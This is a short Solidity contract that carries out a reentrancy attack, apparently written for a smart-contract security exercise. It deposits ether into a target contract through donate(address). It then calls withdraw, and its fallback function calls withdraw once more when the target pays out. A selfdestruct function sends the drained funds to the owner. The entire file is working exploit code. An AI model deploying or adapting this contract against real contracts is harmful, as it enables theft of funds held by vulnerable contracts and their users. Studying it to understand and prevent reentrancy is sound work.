// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract reentrant {
    address payable public s_owner ;
    address payable public s_target;
    bool public s_flag;
    
    constructor(address payable _target) {
        s_owner = payable(msg.sender);
        s_target = _target;
        s_flag = true;
    }

    fallback() external payable {
        if(s_flag){
            s_flag = false;
            (bool success,) = s_target.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
            require(success, "Fallback failed");
        }
        return;
    }

    // The attack function calls the withdraw function from the target contract.
    // When the target contract sends eth to this contract, the fallback function 
    // is executed and it calls the withdraw function from the target contract one more time.
    function attack(uint _amount) public{
        (bool success,) = s_target.call(abi.encodeWithSignature("withdraw(uint256)", _amount));
        require(success, "Failed to attack");
        return;
    }

    function deposit() public payable{
            (bool success,) = s_target.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
            require(success, "Failed to deposit");
            return;
    }

    function killcontract() public{
        selfdestruct(s_owner);
    }

    receive() external payable {
        
    }


}